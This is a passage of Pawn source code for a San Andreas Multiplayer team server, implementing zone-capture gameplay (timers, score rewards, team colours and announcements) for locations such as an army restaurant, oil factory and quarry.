	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Area51(playerid);
public Area51(playerid)
{
	Area51Captured(playerid);
	return 1;
}
//==============================================================================
stock ActiveArmy(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[ARMY] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[ARMY] = 1;
			 	timer[playerid][ARMY] = SetTimerEx("Army", 25000, false,"i",playerid);
			 	Captured[playerid][ARMY] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_AUS_COLOR);
				}
					else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[ARMY], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[ARMY] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Army Restaurant is under attack!");
			    }
			    else if(tCP[ARMY] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Army Restaurant is under attack!");
			    }
			    else if(tCP[ARMY] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Army Restaurant is under attack!");
				}
				else if(tCP[ARMY] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Army Restaurant is under attack!");
				}
				else if(tCP[ARMY] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Army Restaurant is under attack!");
				}
					else if(tCP[ARMY] == TEAM_MARVEL)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
			      SendTeamMessage(TEAM_MARVEL, green,"*Army Restaurant is under attack!");
				}
				else if(tCP[ARMY] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][ARMY] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock ArmyCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][ARMY] = 1;
	UnderAttack[ARMY] = 0;
	KillTimer(timer[playerid][ARMY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][ARMY] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][ARMY] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Army Restaurant"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[ARMY] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[ARMY]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_AUS_COLOR);
    }
    	else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[ARMY], TEAM_ZONE_MARVEL_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"~y~[ZONE]%s has captured ~b~Army Restaurant ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Army Restaurant 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingArmy(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][ARMY] = 1;
	UnderAttack[ARMY] = 0;
	KillTimer(timer[playerid][ARMY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][ARMY] = 25;
    GangZoneStopFlashForAll(Zone[ARMY]);
 	foreach(Player, i)
	{
	   IsPlayerCapturing[i][ARMY] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Army(playerid);
public Army(playerid)
{
	ArmyCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActivePetrol(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[PETROL] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[PETROL] = 1;
			 	timer[playerid][PETROL] = SetTimerEx("Petrol", 25000, false,"i",playerid);
			 	Captured[playerid][PETROL] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_AUS_COLOR);
				}
					else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[PETROL], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[PETROL] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Army petrol bunk is under attack!");
			    }
			    else if(tCP[PETROL] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Army petrol bunk is under attack!");
			    }
			    else if(tCP[PETROL] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Army petrol bunk is under attack!");
				}
				else if(tCP[PETROL] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Army petrol bunk is under attack!");
				}
				else if(tCP[PETROL] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Army petrol bunk is under attack!");
				}
				else if(tCP[PETROL] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
			      SendTeamMessage(TEAM_MARVEL, green,"*Army petrol bunk is under attack!");
				}
				else if(tCP[PETROL] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][PETROL] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock PetrolCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][PETROL] = 1;
	UnderAttack[PETROL] = 0;
	KillTimer(timer[playerid][PETROL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][PETROL] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][PETROL] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Army Petrol Bunk"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[PETROL] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[PETROL]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_AUS_COLOR);
    }
    	else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[PETROL], TEAM_ZONE_MARVEL_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"~y~[ZONE]%s has captured ~b~Army Petrol Bunk ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Army Petrol Bunk 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingPetrol(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][PETROL] = 1;
	UnderAttack[PETROL] = 0;
	KillTimer(timer[playerid][PETROL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][PETROL] = 25;
    GangZoneStopFlashForAll(Zone[PETROL]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][PETROL] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Petrol(playerid);
public Petrol(playerid)
{
	PetrolCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveOil(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[OIL] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[OIL] = 1;
			 	timer[playerid][OIL] = SetTimerEx("Oil", 25000, false,"i",playerid);
			 	Captured[playerid][OIL] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_AUS_COLOR);
				}
					else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[OIL], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[OIL] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Oil Factory is under attack!");
			    }
			    else if(tCP[OIL] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Oil Factory is under attack!");
			    }
			    else if(tCP[OIL] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Oil Factory is under attack!");
				}
				else if(tCP[OIL] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Oil Factory is under attack!");
				}
				else if(tCP[OIL] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Oil Factory is under attack!");
				}
					else if(tCP[OIL] == TEAM_MARVEL)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
			      SendTeamMessage(TEAM_MARVEL, green,"*Oil Factory is under attack!");
				}
				else if(tCP[OIL] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}

				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][OIL] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock OilCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][OIL] = 1;
	UnderAttack[OIL] = 0;
	KillTimer(timer[playerid][OIL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][OIL] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][OIL] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Oil Factory"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[OIL] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[OIL]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[OIL], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_AUS_COLOR);
    }
    else if(gTeam[playerid] == TEAM_MARVEL)
	{
	   GangZoneShowForAll(Zone[OIL], TEAM_ZONE_MARVEL_COLOR);
	}
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"~y~[ZONE]%s has captured ~b~Qil Factory ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Oil Factory 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif

	return 1;
}
stock LeavingOil(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][OIL] = 1;
	UnderAttack[OIL] = 0;
	KillTimer(timer[playerid][OIL]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][OIL] = 25;
    GangZoneStopFlashForAll(Zone[OIL]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][OIL] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Oil(playerid);
public Oil(playerid)
{
	OilCaptured(playerid);
	return 1;
}
//==============================================================================
//==============================================================================
stock ActiveDesert(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[DESERT] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[DESERT] = 1;
			 	timer[playerid][DESERT] = SetTimerEx("Desert", 25000, false,"i",playerid);
			 	Captured[playerid][DESERT] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_AUS_COLOR);
				}
				else if(gTeam[playerid] == TEAM_MARVEL)
				{
   				  GangZoneFlashForAll(Zone[DESERT], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[DESERT] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Gas Factory is under attack!");
			    }
			    else if(tCP[DESERT] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Gas Factory is under attack!");
			    }
			    else if(tCP[DESERT] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Gas Factory is under attack!");
				}
				else if(tCP[DESERT] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Gas Factory is under attack!");
				}
				else if(tCP[DESERT] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Gas Factory is under attack!");
				}
				else if(tCP[DESERT] == TEAM_MARVEL)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
			      SendTeamMessage(TEAM_MARVEL, green,"*Gas Factory is under attack!");
				}
                else if(tCP[DESERT] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][DESERT] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock DesertCaptured(playerid)
{
	for(new num = 0; num < 4; num ++)
	{
		TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]);
	}
	Captured[playerid][DESERT] = 1;
	UnderAttack[DESERT] = 0;
	KillTimer(timer[playerid][DESERT]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][DESERT] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   	IsPlayerCapturing[i][DESERT] = 0;
	   	if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   	{
		   	SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Gas Factory"cwhite"! You received +1 score for it!");
		   	GivePlayerScore(i, 1);
	   	}
	}
	//==========================================================================
	tCP[DESERT] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[DESERT]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_AUS_COLOR);
    }
    	else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[DESERT], TEAM_ZONE_MARVEL_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"y~[ZONE]%s has captured ~b~Gas Factory ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Gas Factory 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingDesert(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][DESERT] = 1;
	UnderAttack[DESERT] = 0;
	KillTimer(timer[playerid][DESERT]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][DESERT] = 25;
    GangZoneStopFlashForAll(Zone[DESERT]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][DESERT] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Desert(playerid);
public Desert(playerid)
{
	DesertCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveQuarry(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[QUARRY] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[QUARRY] = 1;
			 	timer[playerid][QUARRY] = SetTimerEx("Quarry", 25000, false,"i",playerid);
			 	Captured[playerid][QUARRY] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_AUS_COLOR);
				}
				else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[QUARRY] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Quarry is under attack!");
			    }
			    else if(tCP[QUARRY] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Quarry is under attack!");
			    }
